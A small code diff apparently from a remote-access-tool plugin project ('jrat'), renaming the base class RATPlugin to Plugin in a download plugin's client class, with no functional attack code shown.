@@ -1,11 +1,11 @@
 package jrat.plugin.dwl.client;
 
 import iconlib.IconUtils;
-import jrat.api.RATPlugin;
+import jrat.api.Plugin;
 import jrat.api.ui.RATControlMenuEntry;
 import jrat.api.ui.RATMenuItem;
 
-public class DWLPlugin extends RATPlugin {
+public class DWLPlugin extends Plugin {
 	
 	public static final byte HEADER = 110;
 
